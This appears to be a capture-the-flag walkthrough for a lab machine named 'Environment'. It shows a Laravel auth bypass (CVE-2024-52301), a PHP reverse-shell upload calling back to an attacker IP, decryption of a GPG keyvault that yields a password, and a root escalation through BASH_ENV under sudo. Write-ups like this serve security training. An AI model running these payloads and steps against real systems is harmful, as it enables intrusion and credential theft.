## 🔍 Enumeration

```bash
nmap -sV -sC 10.10.11.67
```

Revealed SSH (OpenSSH 9.2p1) and HTTP (nginx / Laravel 11.30.0)

Update `/etc/hosts`:

```
10.10.11.67 environment.htb
```

so you can access via browser.

## 🧠 Exploitation: Auth Bypass (CVE‑2024‑52301)

Laravel 11.30.0 is vulnerable to `--env` override to bypass login logic.

Open Burp or intercept login POST request.

Modify request line from:

```http
POST /login HTTP/1.1
```

to:

```http
POST /login?--env=preprod HTTP/1.1
```

Forward request → you get redirected to `/dashboard` as unauthenticated user.

You are now “logged in” to dashboard section.

## 🐚 RCE via Profile Upload

Prepare reverse shell payload (double-dot extension needed):

```bash
cat <<EOF > shell.php..
GIF89a
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.141/4444 0>&1'"); ?>
EOF
```

Start listener on your machine:

```bash
nc -lvnp 4444
```

Upload via profile page: Dashboard → Profile upload form → select `shell.php..` → Upload

HTML shows:

```html
<img src=/storage/files/shell1.php. ... >
```

Trigger reverse shell:

```url
http://environment.htb/storage/files/shell1.php.
```

You get a shell as www-data:

```bash
www-data@environment:~$ whoami && id && hostname
```

## 🧩 Capturing user.txt

```bash
sudo -u www-data find / -name user.txt 2>/dev/null
cat /home/hish/user.txt
```

✅ Captured user flag

## 🧪 Privilege Escalation: GPG ‑> SSH to hish

Copy keyvault and gnupg dir via reverse shell:

```bash
cd /home/hish/backup
cp keyvault.gpg /tmp/xfil/
```

From Kali:

```bash
wget http://10.10.11.67:8000/keyvault.gpg
```

On Kali, decrypt:

```bash
gpg --import private_key.asc
gpg --decrypt keyvault.gpg
```

You recover passwords:

```
ENVIRONMENT.HTB -> marineSPm@ster!!
```

SSH into hish:

```bash
ssh hish@environment.htb
# Password: marineSPm@ster!!
whoami && id
```

## ⚙️ Privilege Escalation to Root via systeminfo PATH hijack

Check sudo permissions:

```bash
sudo -l
```

Shows hish can run `/usr/bin/systeminfo` as root, and `BASH_ENV` is kept.

Create malicious script:

```bash
echo '/bin/bash' > /tmp/root.sh
chmod +x /tmp/root.sh
```

Set `BASH_ENV` and invoke sudo:

```bash
export BASH_ENV=/tmp/root.sh
sudo /usr/bin/systeminfo
```

You now receive a root shell:

```bash
whoami
cat /root/root.txt
```

## 📝 Summary & Commands Table

| Phase               | Key Commands |
|---------------------|--------------|
| Enumeration         | `nmap`, modify `/etc/hosts` |
| Auth Bypass         | Burp → `POST /login?--env=preprod` |
| Reverse Shell       | Crafted `shell.php..`, upload, visit path |
| User Flag           | `cat /home/hish/user.txt` |
| GPG Decryption      | `gpg --decrypt keyvault.gpg` |
| SSH to hish         | `ssh hish@...` |
| Privilege Escalation| `echo '/bin/bash' > /tmp/root.sh`, `sudo /usr/bin/systeminfo` with `BASH_ENV` set |
